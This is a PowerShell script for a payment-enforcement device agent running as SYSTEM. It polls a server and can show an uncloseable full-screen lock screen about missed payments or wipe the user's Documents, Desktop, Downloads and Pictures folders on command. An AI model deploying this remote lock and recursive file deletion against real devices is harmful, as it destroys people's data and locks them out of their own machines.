# ScarletAgent.ps1 - Scarlet Technical Device Management Agent
# Runs as SYSTEM every 5 minutes via scheduled task

$AgentDir = "C:\Windows\System32\ScarletAgent"
$ConfigFile = "$AgentDir\config.json"
$StateFile = "$AgentDir\state.json"
$LogFile = "$AgentDir\agent.log"
$DeviceUuidFile = "$AgentDir\device_uuid.txt"
$LockFlagFile = "$AgentDir\locked.flag"
$MaxLogSize = 1MB

function Write-Log {
    param([string]$Msg)
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts $Msg" | Add-Content $LogFile
    # Rotate log if too large
    if ((Get-Item $LogFile -ErrorAction SilentlyContinue).Length -gt $MaxLogSize) {
        Move-Item $LogFile "$LogFile.old" -Force
    }
}

# Load config
if (-not (Test-Path $ConfigFile)) { Write-Log "No config file found"; exit 1 }
$Config = Get-Content $ConfigFile | ConvertFrom-Json
$ServerUrl = $Config.ServerUrl
$Token = $Config.Token

# Generate or load persistent device UUID
if (-not (Test-Path $DeviceUuidFile)) {
    $Uuid = [guid]::NewGuid().ToString()
    $Uuid | Set-Content $DeviceUuidFile -Force
} else {
    $Uuid = (Get-Content $DeviceUuidFile).Trim()
}

# Get system info
$OsInfo = ""
try { $OsInfo = (Get-WmiObject Win32_OperatingSystem).Caption + " " + (Get-WmiObject Win32_OperatingSystem).Version }
catch { $OsInfo = "Windows" }
$HostnameVal = $env:COMPUTERNAME

# Load or initialize state
$DeviceToken = $null
if (Test-Path $StateFile) {
    try {
        $StateData = Get-Content $StateFile | ConvertFrom-Json
        $DeviceToken = $StateData.device_token
    } catch { }
}

# Enroll if no device token
if (-not $DeviceToken) {
    Write-Log "Enrolling device..."
    try {
        $Body = @{
            enrollment_token = $Token
            device_uuid = $Uuid
            hostname = $HostnameVal
            os_info = $OsInfo
            platform = "windows"
            agent_version = "1.0.0"
        } | ConvertTo-Json
        $Resp = Invoke-RestMethod -Uri "$ServerUrl/api/agent/enroll" -Method POST -Body $Body -ContentType "application/json" -TimeoutSec 30
        if ($Resp.device_token) {
            @{ device_token = $Resp.device_token; device_id = $Resp.device_id } | ConvertTo-Json | Set-Content $StateFile -Force
            $DeviceToken = $Resp.device_token
            Write-Log "Enrolled as device ID $($Resp.device_id)"
        }
    } catch {
        Write-Log "Enrollment failed: $_"
        exit 1
    }
}

# Heartbeat + poll for commands
try {
    $HbBody = @{ device_token = $DeviceToken; device_uuid = $Uuid; current_status = "online" } | ConvertTo-Json
    $Resp = Invoke-RestMethod -Uri "$ServerUrl/api/agent/heartbeat" -Method POST -Body $HbBody -ContentType "application/json" -TimeoutSec 30
    Write-Log "Heartbeat OK. Lock: $($Resp.lock_status). Command: $($Resp.command.action)"

    $NewLockStatus = $Resp.lock_status
    $Result = "success"

    if ($Resp.command) {
        $Cmd = $Resp.command

        if ($Cmd.action -eq "lock") {
            Write-Log "Executing LOCK command"
            $NewLockStatus = "locked"
            Set-Content $LockFlagFile "locked" -Force

            # Show full-screen lock overlay in background job
            $LockMsg = $Cmd.message
            if (-not $LockMsg) { $LockMsg = "This device has been locked due to a missed payment. Please contact Scarlet Technical at (765) 555-0100 or visit scarlet-technical.polsia.app to resolve your account." }

            $ShowLockBlock = {
                param($LockMessage)
                Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase
                try {
                    $app = [System.Windows.Application]::new()
                    $win = New-Object System.Windows.Window
                    $win.WindowStyle = "None"
                    $win.ResizeMode = "NoResize"
                    $win.WindowState = "Maximized"
                    $win.Topmost = $true
                    $win.Background = [System.Windows.Media.Brushes]::Black
                    $win.Title = "DEVICE LOCKED"

                    $grid = New-Object System.Windows.Controls.Grid
                    $panel = New-Object System.Windows.Controls.StackPanel
                    $panel.VerticalAlignment = "Center"
                    $panel.HorizontalAlignment = "Center"
                    $panel.Margin = [System.Windows.Thickness]::new(40)

                    $makeText = {
                        param($text, $size, $color, $bold, $wrap)
                        $tb = New-Object System.Windows.Controls.TextBlock
                        $tb.Text = $text
                        $tb.FontSize = $size
                        $tb.Foreground = $color
                        $tb.TextAlignment = "Center"
                        $tb.Margin = [System.Windows.Thickness]::new(0, 0, 0, 16)
                        if ($bold) { $tb.FontWeight = "Bold" }
                        if ($wrap) { $tb.TextWrapping = "Wrap"; $tb.MaxWidth = 800 }
                        $tb
                    }

                    $panel.Children.Add((&$makeText "DEVICE LOCKED" 52 ([System.Windows.Media.Brushes]::Red) $true $false)) | Out-Null
                    $panel.Children.Add((&$makeText "Scarlet Technical" 26 ([System.Windows.Media.Brushes]::White) $false $false)) | Out-Null
                    $panel.Children.Add((&$makeText $LockMessage 18 ([System.Windows.Media.Brushes]::White) $false $true)) | Out-Null
                    $panel.Children.Add((&$makeText "Contact: (765) 555-0100  |  scarlet-technical.polsia.app" 15 ([System.Windows.Media.Brushes]::Yellow) $false $false)) | Out-Null

                    $grid.Children.Add($panel) | Out-Null
                    $win.Content = $grid

                    # Block close events
                    $win.add_Closing({ $_.Cancel = $true })
                    $win.add_PreviewKeyDown({
                        if ($_.Key -eq "F4" -and $_.KeyboardDevice.Modifiers -eq "Alt") { $_.Handled = $true }
                        if ($_.Key -eq "Escape") { $_.Handled = $true }
                        if ($_.Key -eq "F11") { $_.Handled = $true }
                    })
                    $win.ShowDialog() | Out-Null
                } catch { }
            }
            Start-Job -ScriptBlock $ShowLockBlock -ArgumentList $LockMsg | Out-Null

        } elseif ($Cmd.action -eq "unlock") {
            Write-Log "Executing UNLOCK command"
            $NewLockStatus = "unlocked"
            Remove-Item $LockFlagFile -Force -ErrorAction SilentlyContinue
            # Kill lock overlay jobs
            Get-Job | Where-Object { $_.State -eq "Running" } | Stop-Job -PassThru | Remove-Job -Force
            Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -like "*DEVICE LOCKED*" } | Stop-Process -Force

        } elseif ($Cmd.action -eq "wipe") {
            Write-Log "Executing WIPE command"
            $NewLockStatus = "wiped"
            $dirs = @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Pictures")
            foreach ($d in $dirs) {
                if (Test-Path $d) { Get-ChildItem $d | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue }
            }
        }

        # Acknowledge command
        $AckBody = @{
            device_token = $DeviceToken
            device_uuid = $Uuid
            command_id = $Cmd.id
            result = $Result
            new_lock_status = $NewLockStatus
        } | ConvertTo-Json
        Invoke-RestMethod -Uri "$ServerUrl/api/agent/command-ack" -Method POST -Body $AckBody -ContentType "application/json" -TimeoutSec 30 | Out-Null
        Write-Log "Command $($Cmd.action) acknowledged"
    }

    # Re-enforce lock if device is locked and no overlay running
    if ($Resp.lock_status -eq "locked" -and -not $Resp.command) {
        $LockRunning = $false
        if (Test-Path $LockFlagFile) {
            $LockRunning = (Get-Job | Where-Object { $_.State -eq "Running" }).Count -gt 0
        }
        if (-not $LockRunning) {
            Set-Content $LockFlagFile "locked" -Force
            $DefaultMsg = "This device has been locked due to a missed payment. Please contact Scarlet Technical at (765) 555-0100 or visit scarlet-technical.polsia.app to resolve your account."
            $ShowLockBlock2 = {
                param($LockMessage)
                Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase
                try {
                    $app = [System.Windows.Application]::new()
                    $win = New-Object System.Windows.Window
                    $win.WindowStyle = "None"; $win.ResizeMode = "NoResize"; $win.WindowState = "Maximized"
                    $win.Topmost = $true; $win.Background = [System.Windows.Media.Brushes]::Black; $win.Title = "DEVICE LOCKED"
                    $grid = New-Object System.Windows.Controls.Grid
                    $panel = New-Object System.Windows.Controls.StackPanel
                    $panel.VerticalAlignment = "Center"; $panel.HorizontalAlignment = "Center"; $panel.Margin = [System.Windows.Thickness]::new(40)
                    $t1 = New-Object System.Windows.Controls.TextBlock; $t1.Text = "DEVICE LOCKED"; $t1.FontSize = 52; $t1.FontWeight = "Bold"; $t1.Foreground = [System.Windows.Media.Brushes]::Red; $t1.TextAlignment = "Center"; $t1.Margin = [System.Windows.Thickness]::new(0,0,0,16)
                    $t2 = New-Object System.Windows.Controls.TextBlock; $t2.Text = "Scarlet Technical"; $t2.FontSize = 26; $t2.Foreground = [System.Windows.Media.Brushes]::White; $t2.TextAlignment = "Center"; $t2.Margin = [System.Windows.Thickness]::new(0,0,0,16)
                    $t3 = New-Object System.Windows.Controls.TextBlock; $t3.Text = $LockMessage; $t3.FontSize = 18; $t3.Foreground = [System.Windows.Media.Brushes]::White; $t3.TextAlignment = "Center"; $t3.TextWrapping = "Wrap"; $t3.MaxWidth = 800; $t3.Margin = [System.Windows.Thickness]::new(0,0,0,16)
                    $t4 = New-Object System.Windows.Controls.TextBlock; $t4.Text = "Contact: (765) 555-0100  |  scarlet-technical.polsia.app"; $t4.FontSize = 15; $t4.Foreground = [System.Windows.Media.Brushes]::Yellow; $t4.TextAlignment = "Center"
                    $panel.Children.Add($t1) | Out-Null; $panel.Children.Add($t2) | Out-Null; $panel.Children.Add($t3) | Out-Null; $panel.Children.Add($t4) | Out-Null
                    $grid.Children.Add($panel) | Out-Null; $win.Content = $grid
                    $win.add_Closing({ $_.Cancel = $true })
                    $win.ShowDialog() | Out-Null
                } catch { }
            }
            Start-Job -ScriptBlock $ShowLockBlock2 -ArgumentList $DefaultMsg | Out-Null
            Write-Log "Re-applied lock overlay"
        }
    }

} catch {
    Write-Log "Heartbeat failed: $_"
}
